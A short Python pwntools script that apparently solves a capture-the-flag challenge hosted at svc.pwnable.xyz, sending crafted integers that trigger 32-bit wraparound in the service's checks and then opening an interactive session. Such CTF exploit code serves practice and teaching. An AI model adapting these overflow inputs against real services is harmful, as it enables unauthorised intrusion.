from pwn import *
# from z3 import *

# r = process("./challenge")
r = remote("svc.pwnable.xyz",30008)
# # s.add(x > 0 )
# # s.add(y > 0 )
# s.add(x <= 1336)
# s.add(y <= 1337)
# s.add(x - y == 1337)
# print s.check()
# print s.model()

def level1():
    r.sendlineafter("x:" , "1336")
    r.sendlineafter("y:" , "4294967295")

def level2():
    r.sendlineafter("===","3 " + str((2**32+1337)/3))

level1()
level2()
r.sendline("a")
r.interactive()